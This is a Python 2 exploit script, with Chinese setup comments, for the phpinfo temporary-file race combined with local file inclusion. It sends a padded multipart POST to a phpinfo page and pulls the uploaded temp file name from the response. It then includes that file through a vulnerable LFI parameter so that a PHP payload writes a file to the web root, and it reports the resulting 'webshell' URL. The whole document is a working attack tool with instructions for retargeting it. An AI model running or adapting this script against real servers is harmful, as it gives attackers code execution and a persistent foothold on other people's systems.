﻿#!/usr/bin/env python
# encoding=utf-8
# Author : idwar
# http://secer.org

'''

可能需要你改的几个地方：
1、host
2、port
3、request中的phpinfo页面名字及路径
4、hello_lfi() 函数中的url，即存在lfi的页面和参数
5、如果不成功或报错，尝试增加padding长度到7000、8000试试
6、某些开了magic_quotes_gpc或者其他东西不能%00的，自行想办法截断并在（4）的位置对应修改
 Good Luck :)
7、payload的./指的是当前脚本的目录下,所以要注意最后输出的结果

'''

import re
import urllib2
import hashlib
from socket import *
from time import sleep
host = '192.168.227.133'
#host = gethostbyname(domain)
port = 80
shell_name = hashlib.md5(host).hexdigest() + '.php'
pattern = re.compile(r'''\[tmp_name\]\s=&gt;\s(.*)\W*error]''')

payload = '''idwar<?php fputs(fopen('./''' + shell_name + '''\',"w"),"<?php phpinfo();?>")?>\r'''
req = '''-----------------------------7dbff1ded0714\r
Content-Disposition: form-data; name="dummyname"; filename="test.txt"\r
Content-Type: text/plain\r
\r
%s
-----------------------------7dbff1ded0714--\r''' % payload

padding='A' * 8000
phpinfo_req ='''POST /phpinfo.php?a='''+padding+''' HTTP/1.0\r
Cookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie='''+padding+'''\r
HTTP_ACCEPT: ''' + padding + '''\r
HTTP_USER_AGENT: ''' + padding + '''\r
HTTP_ACCEPT_LANGUAGE: ''' + padding + '''\r
HTTP_PRAGMA: ''' + padding + '''\r
Content-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\r
Content-Length: %s\r
Host: %s\r
\r
%s''' % (len(req), host, req)


def hello_lfi():
    while 1:
        s = socket(AF_INET, SOCK_STREAM)
        s.connect((host, port))
        s.send(phpinfo_req)
        data = ''
        while r'</body></html>' not in data:
            data = s.recv(9999)
            search_ = re.search(pattern, data)
            if search_:
                tmp_file_name = search_.group(1)
                url = r'http://192.168.227.133/lfi/ex1.php?f=%s' % tmp_file_name
                print url
                search_request = urllib2.Request(url)
                search_response = urllib2.urlopen(search_request)
                html_data = search_response.read()
                if 'idwar' in html_data:
                    s.close()
                    return '\nDone. Your webshell is : \n\n%s\n' % ('http://' + host + '/' + shell_name)
                    #import sys;sys.exit()
        s.close()
if __name__ == '__main__':
    print hello_lfi()
    print '\n Good Luck :)'
